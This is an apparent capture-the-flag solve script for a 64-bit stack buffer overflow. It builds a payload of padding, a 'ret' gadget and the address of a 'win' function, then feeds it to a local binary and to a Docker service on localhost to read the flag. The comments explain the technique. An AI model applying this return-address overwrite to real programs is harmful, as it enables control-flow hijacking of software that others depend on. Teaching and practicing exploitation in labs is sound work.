
padding=$1
if [ -z "$padding" ]; then
	echo "usage: ./solve.sh <padding>"
	exit 1
fi

echo "
###########################################################################
################# 1) vuln-inspect.c ILLUSTRATION EXAMPLE ##################
###########################################################################
"

# Compile edited source code.
if ! make inspect ADDONS="-g -DOFFSET=$padding" 2> /dev/null; then
	echo "failed to compile vuln - abort"
	exit 1
fi

# Defining target function in vuln.
target="win"

# Find target address in executable binary.
addr=$(objdump -t vuln|grep $target|cut -d':' -f2|cut -d' ' -f1)
echo "FOUND ADDRESS - &$target := 0x$addr"

# Create binary input file for vuln program.
truncate -s 0 hexinput.bin && truncate -s $padding hexinput.bin

## Stack Alignment:
# Some 64-bit instructions require 16-byte alignment.
# Our instruction pointer lies at a place such that print_flag() will crash because of this.
# Therefore, we place the address to any existing 'ret' (return) instruction immediately before the target address.
# The 'ret' instruction will pop the target address from the stack and continue into print_flag() with a correctly aligned stack.
# 
# Tl;dr: 
# Placing address of 'ret'-instruction before target address to align stack.
# 
# Find 'ret'-address in executable binary.
ret=$(objdump -d vuln|grep ret|head -n 1|cut -d':' -f1|tr -d ' ')
# Prefix hex-string with '0' until 16-character (8-byte) long.
ret=$(printf %016d%s 0 40101a|tail -c 16)
echo "FOUND ADDRESS - &ret := 0x$ret"

# Transform 'ret'- and target-address from hex-strings into binary streams and append to file.
echo $ret|fold -w2|tac|xxd -r -p >> hexinput.bin
echo $addr|fold -w2|tac|xxd -r -p >> hexinput.bin

## Hint:
# Open 'hexinput.bin' in vscode with "Hex Editor"-extention to see how the input looks like in bytes vs. hex-string.

echo "Executing illustration example..." && echo
if ! ./vuln < hexinput.bin|tee .tmp.out|grep -q "TD{.*}"; then
	echo "found no flag - padding := $padding"
	exit 1
fi
cat .tmp.out && rm .tmp.out && echo

echo "
###########################################################################
#################### 2) vuln.c STACK OVERFLOW EXPLOIT #####################
###########################################################################
"

# Compile unedited source code.
rm vuln
if ! make overflow 2> /dev/null; then
	echo "failed to compile vuln - abort"
	exit 1
fi

# Target address.
addr=$(objdump -t vuln|grep $target|cut -d':' -f2|cut -d' ' -f1)
echo "FOUND ADDRESS - &$target := 0x$addr"

# Input binary with padding.
truncate -s 0 hexinput.bin && truncate -s $padding hexinput.bin

# 'ret'-instruction address.
ret=$(objdump -d vuln|grep ret|head -n 1|cut -d':' -f1|tr -d ' ')
ret=$(printf %016d%s 0 40101a|tail -c 16)
echo "FOUND ADDRESS - &ret := 0x$ret"

# Append adresses to input binary.
echo $ret|fold -w2|tac|xxd -r -p >> hexinput.bin
echo $addr|fold -w2|tac|xxd -r -p >> hexinput.bin

echo "Executing local solution..." && echo
if ! ./vuln < hexinput.bin|grep "TD{.*}"; then
	echo "found no flag - padding := $padding"
	exit 1
fi

echo "
###########################################################################
###################### 3) DOCKER CONTAINER EXPLOIT ########################
###########################################################################
"

# Build docker image.
if ! docker build -q -t overflow2 . > /dev/null; then
	echo "failed build docker image - abort"
	exit 1
elif [ ! -z $(docker ps -aq) ]; then
	docker stop $(docker ps -aq)
fi
# Start docker container.
id=$(docker run -d --rm --name overflow2 -p 9002:9002 overflow2)
if [ -z $id ]; then
	echo "failed to start docker image - abort"
	exit 1
fi
# Show running containers.
docker ps -a

cat hexinput.bin|nc localhost 9002

# Container should still be running after exploit.
docker ps -a

# Stop service.
docker stop $id
